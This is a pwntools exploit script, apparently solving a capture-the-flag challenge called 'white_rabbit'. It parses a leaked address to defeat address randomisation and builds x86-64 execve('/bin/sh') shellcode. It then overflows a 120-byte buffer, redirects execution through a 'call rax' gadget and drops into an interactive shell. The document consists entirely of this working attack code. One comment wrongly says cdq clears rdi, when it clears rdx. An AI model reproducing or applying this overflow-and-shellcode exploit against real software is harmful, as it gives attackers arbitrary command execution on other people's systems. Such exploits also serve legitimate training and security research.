#!/usr/bin/python3
from pwn import process, p64, asm

shell = process("./white_rabbit")

shell.recvuntil(b"> ")
binary_base = int(shell.recvline().strip(), 16) - 0x1180

shellcode = asm("""
    push 0x3b                 # execve()
    pop rax                   # $rax = execve()

    mov rdi, 0x68732f6e69622f # $rdi = "/bin/sh"
    push rdi                  # $rsp = &"/bin/sh"
    push rsp                  # &"/bin/sh"
    pop rdi                   # $rdi = &"/bin/sh"

    cdq                       # $rdi = NULL
    push rdx                  # $rsp = &0x0
    pop rsi                   # $rsi = NULL

    syscall                   # system call
""", arch="amd64")

offset = 120
junk = b"A" * (offset - len(shellcode))

payload  = b""
payload += shellcode
payload += junk
payload += p64(binary_base + 0x1014) # call rax;

shell.sendlineafter(b"...\n", payload)
shell.interactive()
